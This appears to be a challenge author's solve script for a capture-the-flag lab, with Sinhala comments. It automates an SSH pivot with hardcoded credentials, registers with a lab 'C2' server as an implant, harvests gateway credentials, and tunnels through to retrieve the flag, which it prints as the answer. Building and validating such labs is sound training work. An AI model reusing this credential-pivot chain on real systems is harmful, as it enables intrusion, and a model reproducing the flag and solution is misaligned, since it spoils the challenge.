#!/usr/bin/env bash
# =====================================================================
#  RAVEN//TRACE — S6 "WATCHTOWER"  ::  AUTHOR SOLVE SCRIPT (canary)
# ---------------------------------------------------------------------
#  මේ script එක player කෙනෙක් අතින් කරන pivot එකම automate කරනවා —
#  challenge එක end-to-end solve වෙනවද කියලා ඔප්පු කරන්න.
#  (Testing & Validation Plan — Tier 2 & Tier 3 evidence.)
#
#  කලින් මේක run කරන්න:
#       docker compose up -d --build
#
#  ඕන dependency:  sshpass   (Kali: sudo apt install -y sshpass)
#
#  පාවිච්චිය:  ./solve_S6.sh
# =====================================================================
set -euo pipefail

# ---- upstream artifacts (S1–S5 වලින් player ට එන values) ----
RAVEN_ID="RAVEN-17"                      # S1/S2
IMPLANT_AUTH="USFE-INV-07"               # S3
GDN_CLIENT="guardian_update"             # S3
FOOTHOLD_USER="j.portal"                 # S5
FOOTHOLD_PASS='Bl4ck0ut!2026'            # S5
WT_API_KEY="wt_7c1a9f2b3e4d88a0"         # S5

HOST_SSH_PORT="2222"                     # foothold published port
SSHOPT="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR"

echo "=== [1] foothold එකට SSH කරනවා (S5 creds) ==="
sshpass -p "$FOOTHOLD_PASS" ssh $SSHOPT -p "$HOST_SSH_PORT" \
    "${FOOTHOLD_USER}@localhost" "echo '  inside foothold as '\$(whoami)"

echo "=== [2] foothold එකෙන් C2 register කරනවා (implant identity) ==="
C2_RESP=$(sshpass -p "$FOOTHOLD_PASS" ssh $SSHOPT -p "$HOST_SSH_PORT" \
    "${FOOTHOLD_USER}@localhost" \
    "curl -s -X POST http://c2:8080/api/v3/register \
        -H 'X-Raven-ID: ${RAVEN_ID}' \
        -H 'Authorization: ${IMPLANT_AUTH}' \
        -H 'X-GDN-Client: ${GDN_CLIENT}'")
echo "$C2_RESP" | python3 -m json.tool

# C2 response එකෙන් gw creds extract කරනවා
GW_USER=$(echo "$C2_RESP" | python3 -c "import sys,json;print(json.load(sys.stdin)['pivot']['ssh_user'])")
GW_PASS=$(echo "$C2_RESP" | python3 -c "import sys,json;print(json.load(sys.stdin)['pivot']['ssh_pass'])")
echo "  C2 issued gateway creds -> ${GW_USER}"

echo "=== [3] foothold -> watchtower-gw -> WATCHTOWER curl (pivot) ==="
# -J (ProxyJump): foothold හරහා watchtower-gw එකට connect වෙනවා.
# gw එක core+mon දෙකේම ඉන්න නිසා, gw එකෙන් watchtower reach කරන්න පුළුවන්.
EVIDENCE=$(sshpass -p "$GW_PASS" ssh $SSHOPT \
    -o ProxyCommand="sshpass -p '${FOOTHOLD_PASS}' ssh ${SSHOPT} -p ${HOST_SSH_PORT} -W %h:%p ${FOOTHOLD_USER}@localhost" \
    "${GW_USER}@watchtower-gw" \
    "curl -s http://watchtower:9000/evidence -H 'X-WT-Key: ${WT_API_KEY}'")
echo "$EVIDENCE"

echo "=== [4] FLAG ==="
FLAG=$(echo "$EVIDENCE" | grep -o 'RAVEN{[a-z0-9_]*}' | head -1)
echo "  recovered: $FLAG"
if [ "$FLAG" = "RAVEN{you_were_the_attacker}" ]; then
    echo "[RESULT] PASS ✔"
else
    echo "[RESULT] FAIL ✘"; exit 1
fi
